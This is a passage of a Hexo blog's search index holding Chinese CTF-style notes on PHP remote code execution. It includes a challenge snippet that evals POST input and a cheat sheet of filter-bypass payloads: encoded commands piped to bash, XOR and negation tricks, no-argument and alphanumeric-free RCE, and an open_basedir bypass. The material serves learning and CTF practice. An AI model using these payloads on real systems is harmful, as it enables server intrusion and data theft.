class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>这个的话，查看源代码，可以看到他将数字和字母换成？了，那个可以利用缓冲区用exit();结束</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>然后的话就是使用c&#x3D;var_export进行扫描文件根目录：c&#x3D;var_export(scandir(“&#x2F;“));exit;再c&#x3D;include(“&#x2F;flag.txt”);exit();</p><p>剩下的以后再说，有点不会了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/03/02/RCE/"/>
      <url>/2025/03/02/RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简述："><a href="#1-简述：" class="headerlink" title="1.简述："></a>1.简述：</h2><p>在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了RCE漏洞。</p><p>危害：可以让用户（通常是系统管理员或普通用户）执行任意系统命令的漏洞。这种漏洞通常存在于某些程序或脚本中，允许输入参数被编码并传递给可执行文件。</p><p> 比如：如果应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h2 id="2-分类：命令执行和代码执行"><a href="#2-分类：命令执行和代码执行" class="headerlink" title="2.分类：命令执行和代码执行"></a>2.分类：命令执行和代码执行</h2><h2 id="3-常见函数："><a href="#3-常见函数：" class="headerlink" title="3.常见函数："></a>3.常见函数：</h2><h3 id="1-命令执行函数："><a href="#1-命令执行函数：" class="headerlink" title="(1)命令执行函数："></a>(1)命令执行函数：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()：能将字符串作为OS命令执行，且返回命令执行结果；</span><br><span class="line"></span><br><span class="line">exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</span><br><span class="line"></span><br><span class="line">shell_exec()：能将字符串作为OS命令执行</span><br><span class="line"></span><br><span class="line">passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</span><br><span class="line"></span><br><span class="line">popen()：打开进程文件指针</span><br><span class="line"></span><br><span class="line">proc_open()：与popen()类似</span><br><span class="line"></span><br><span class="line">pcntl_exec()：在当前进程空间执行指定程序；</span><br><span class="line"></span><br><span class="line">反引号``：反引号``内的字符串会被解析为OS命令；</span><br><span class="line"></span><br><span class="line">补充：OS命令执行是指将用户的文本命令通过操作系统转化为二进制指令并执行的过程</span><br></pre></td></tr></table></figure><h3 id="2-代码执行函数："><a href="#2-代码执行函数：" class="headerlink" title="(2)代码执行函数："></a>(2)代码执行函数：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval()：将字符串作为php代码执行；</span><br><span class="line"></span><br><span class="line">assert()：将字符串作为php代码执行；</span><br><span class="line"></span><br><span class="line">preg_replace()：正则匹配替换字符串；</span><br><span class="line"></span><br><span class="line">create_function()：主要创建匿名函数；</span><br><span class="line"></span><br><span class="line">call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</span><br><span class="line"></span><br><span class="line">call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</span><br><span class="line"></span><br><span class="line">可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；</span><br></pre></td></tr></table></figure><h2 id="4-常见绕过："><a href="#4-常见绕过：" class="headerlink" title="4.常见绕过："></a>4.常见绕过：</h2><h3 id="1-管道符绕过："><a href="#1-管道符绕过：" class="headerlink" title="(1)管道符绕过："></a>(1)管道符绕过：</h3><p>；：即；前后都执行</p><p>&amp;：即&amp;前后都执行</p><p>&amp;&amp;：即如果&amp;&amp;前为真才执行&amp;&amp;后面的，不然只执行&amp;&amp;前面的</p><p>| ：即显示|后面的执行结果</p><p>||：||前面为假时才执行||后面的，否则只执行||前面的</p><h3 id="2-空格过滤："><a href="#2-空格过滤：" class="headerlink" title="(2)空格过滤："></a>(2)空格过滤：</h3><p>空格可以替换成：</p><p>&lt;  &lt;&gt;  %20(即space) %09(即TAB)  $IFS$9  ${IFS}  $IFS  {}</p><h3 id="3-反斜杠："><a href="#3-反斜杠：" class="headerlink" title="(3)反斜杠："></a>(3)反斜杠：</h3><p>如cat、ls被过滤，使用\绕过：<br>c\at &#x2F;flag<br>l\s &#x2F;</p><h3 id="4-取反绕过："><a href="#4-取反绕过：" class="headerlink" title="(4)取反绕过："></a>(4)取反绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="5-异或绕过"><a href="#5-异或绕过" class="headerlink" title="(5)异或绕过:"></a>(5)异或绕过:</h3><p>这里推荐yu师傅的脚本</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><h3 id="6-黑名单绕过："><a href="#6-黑名单绕过：" class="headerlink" title="(6)黑名单绕过："></a>(6)黑名单绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//变量拼接，如flag被过滤</span><br><span class="line">将：</span><br><span class="line">cat /flag</span><br><span class="line">替换为：</span><br><span class="line">b=ag;cat /fl$b</span><br><span class="line">或者:ta&quot;&quot;c ?l*</span><br><span class="line">(? ：只匹配单个字符</span><br><span class="line">* ：自动匹配后续（或者说是匹配一次或多次）)</span><br><span class="line"></span><br><span class="line">//读取根目录</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;));  /.是本级目录</span><br><span class="line">//读flag</span><br><span class="line">eval(var_dump(file_get_contents($_GET[&#x27;a&#x27;])););&amp;a=/flag</span><br><span class="line"></span><br><span class="line">//等效于打开ls目录下的文件</span><br><span class="line">cat `ls`</span><br><span class="line">//system被绕过</span><br><span class="line">(sy.(st).(em))(&#x27;ls&#x27;)?&gt;</span><br><span class="line">//分号被过滤</span><br><span class="line">使用?&gt;</span><br><span class="line"></span><br><span class="line">//_被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线_</span><br><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br><span class="line"></span><br><span class="line">//php标签绕过</span><br><span class="line">?&gt;&lt;?= phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="7-base和hexo编码绕过："><a href="#7-base和hexo编码绕过：" class="headerlink" title="(7)base和hexo编码绕过："></a>(7)base和hexo编码绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//base64编码绕过,编码cat /flag，反引号、| bash、$()用于执行系统命令</span><br><span class="line">`echo Y2F0IC9mbGFn | base64 -d`</span><br><span class="line">echo Y2F0IC9mbGFn | base64 -d | bash</span><br><span class="line">$(echo Y2F0IC9mbGFn | base64 -d)</span><br><span class="line"></span><br><span class="line">//hex编码绕过，编码cat /flag,| bash用于执行系统命令</span><br><span class="line">echo &#x27;636174202f666c6167&#x27; | xxd -r -p | bash</span><br><span class="line"></span><br><span class="line">//shellcode编码</span><br><span class="line">//十六进制编码</span><br></pre></td></tr></table></figure><h3 id="8-正则匹配绕过："><a href="#8-正则匹配绕过：" class="headerlink" title="(8)正则匹配绕过："></a>(8)正则匹配绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//如flag被过滤</span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;3&#125;</span><br><span class="line"></span><br><span class="line">cat /?l*</span><br></pre></td></tr></table></figure><h3 id="9-引号绕过："><a href="#9-引号绕过：" class="headerlink" title="(9)引号绕过："></a>(9)引号绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//如cat、ls被过滤*</span><br><span class="line"></span><br><span class="line">ca&quot;&quot;t /flag</span><br><span class="line"></span><br><span class="line">l&#x27;s&#x27; /</span><br></pre></td></tr></table></figure><h3 id="10-cat替换命令："><a href="#10-cat替换命令：" class="headerlink" title="(10)cat替换命令："></a>(10)cat替换命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac与cat相反，按行反向输出</span><br><span class="line">more按页显示，用于文件内容较多且不能滚动屏幕时查看文件</span><br><span class="line">less与more类似</span><br><span class="line">tail查看文件末几行</span><br><span class="line">head查看文件首几行</span><br><span class="line">nl在cat查看文件的基础上显示行号</span><br><span class="line">od以二进制方式读文件，od -A d -c /flag转人可读字符</span><br><span class="line">xxd以二进制方式读文件，同时有可读字符显示</span><br><span class="line">sort排序文件</span><br><span class="line">uniq报告或删除文件的重复行</span><br><span class="line">file -f报错文件内容</span><br><span class="line">grep过滤查找字符串，grep flag /flag</span><br><span class="line"></span><br><span class="line">strings(也是)</span><br></pre></td></tr></table></figure><h3 id="11-无回显绕过："><a href="#11-无回显绕过：" class="headerlink" title="(11)无回显绕过："></a>(11)无回显绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">//eval()无输出</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure><h3 id="12-无参数RCE"><a href="#12-无参数RCE" class="headerlink" title="(12)无参数RCE"></a>(12)无参数RCE</h3><p>​    利用getallheaders()、get_defined_vars()、session_id等；</p><h4 id="getallheaders-："><a href="#getallheaders-：" class="headerlink" title="getallheaders()："></a>getallheaders()：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);&#125;</span><br><span class="line">else</span><br><span class="line">    die(&#x27;nonono&#x27;);&#125;</span><br><span class="line">else</span><br><span class="line">    echo(&#x27;please input code&#x27;);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://1111.icu/getallheaders().php?code=var_dump(getallheaders());</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(7) &#123; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept&quot;]=&gt; string(135) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot; [&quot;User-Agent&quot;]=&gt; string(111) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot; [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; [&quot;Connection&quot;]=&gt; string(5) &quot;close&quot; [&quot;Host&quot;]=&gt; string(8) &quot;1111.icu&quot; &#125;</span><br></pre></td></tr></table></figure><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：1:phpinfo();</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1]=&gt; string(10) &quot;phpinfo()</span><br></pre></td></tr></table></figure><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=eval(end(getallheaders()));</span><br></pre></td></tr></table></figure><p>换言之，就可以实现任意php代码的代码执行了</p><h4 id="get-defined-vars-："><a href="#get-defined-vars-：" class="headerlink" title="get_defined_vars()："></a>get_defined_vars()：</h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p>get_defined_vars()是获得四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=eval(end(current((get_defined_vars()));wllm=phpinfo();</span><br></pre></td></tr></table></figure><h4 id="session-id："><a href="#session-id：" class="headerlink" title="session_id："></a>session_id：</h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=var_dump(session_id(session_start()));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:PHPSESSID=qwertyu</span><br></pre></td></tr></table></figure><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code>(不过记得加hex2b)</p><h3 id="13-无字母数字RCE"><a href="#13-无字母数字RCE" class="headerlink" title="(13)无字母数字RCE"></a>(13)无字母数字RCE</h3><p>​    异或、取反、自增、临时文件上传；</p><h3 id="14-取反绕过："><a href="#14-取反绕过：" class="headerlink" title="(14)取反绕过："></a>(14)取反绕过：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"></span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="15-长度限制："><a href="#15-长度限制：" class="headerlink" title="(15)长度限制："></a>(15)长度限制：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span><br><span class="line">ls -t &gt; shell</span><br><span class="line">sh shell(读取flag)</span><br><span class="line">空格\ ： 这个其实是换行。</span><br><span class="line">ta\</span><br><span class="line">c</span><br><span class="line">这个就是tac的意思</span><br><span class="line">ls -t ：按照时间将文本排序输出，自动换行</span><br><span class="line">ls -t &gt; shell：将ls -t的输出储存到shell文件中</span><br><span class="line">我们首先是用touch命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个\\的原因在于，第一个\用于将后面的\变成字符串，第二个\是用来将后面的文本转换为字符串，以便用于后面的测试。</span><br><span class="line">补充：</span><br><span class="line">1&gt;a可以创建a这一个空文件夹</span><br><span class="line">ls&gt;c会将目录下面的文件名写入到c文件中；</span><br><span class="line">\作为转义符，转义之后的&#x27;&#x27;是用来换行分隔，也就是换行也是连接的</span><br></pre></td></tr></table></figure><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>关于有一些全是报错的；就比如使用var_export(scandir(“&#x2F;“));扫描根目录文件结果发现全是？！什么的；就是全给你替换了，我们可以结合 exit() 函数执行php代码让后面的匹配缓冲区不执行直接退出</p><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 glob:// 伪协议绕过 open_basedir，读取根目录下的文件，payload：</span><br><span class="line"></span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;</span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line">或者c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;getFilename().&quot; &quot;);&#125; exit(0);</span><br></pre></td></tr></table></figure><h3 id="关于极限RCE"><a href="#关于极限RCE" class="headerlink" title="关于极限RCE:"></a>关于极限RCE:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;  //得到Array</span><br><span class="line">$_=$_[&#x27;/&#x27;==&#x27;+&#x27;];   //让[]里的值报错返回0,取Array[0]=A，此时$_=A</span><br><span class="line">$____=&#x27;_&#x27;;   //让$____=_，后面容易拼接</span><br><span class="line">$__=$_;   //将A赋给$__</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;  //A自增到G，此时$__=G</span><br><span class="line">$____.=$__; //将_和G拼接起来，此时$____=_G</span><br><span class="line">$__=$_;   //再将$__还原成A</span><br><span class="line">$__++;$__++;$__++;$__++;  //A自增到E,此时__=E</span><br><span class="line">$____.=$__;  //E和_G拼接，此时$____为_GE</span><br><span class="line">$__=$_;  //再将__换源成A</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  //A自增成T此时__=T</span><br><span class="line">$____.=$__;  //再拼接成_GET，此时$____=_GET</span><br><span class="line">$_=$____;   //为了方便起见，我们把____换成_</span><br><span class="line">($$_[_])($$_[__]);  //拼成我们想要的($_GET[_])($_GET[__]),传入_和__命令执行即可  </span><br></pre></td></tr></table></figure><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv:"></a>getenv:</h3><p>getenv — 获取单个或者全部环境变量</p><p>参数name</p><p>getenv(name)可以利用此函数获取一个名为name环境变量的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = getenv(phpinfo());</span><br><span class="line">var_dump($ip);</span><br><span class="line">//phpinfo() 获取全部的环境变量</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/18/hello-world/"/>
      <url>/2025/02/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
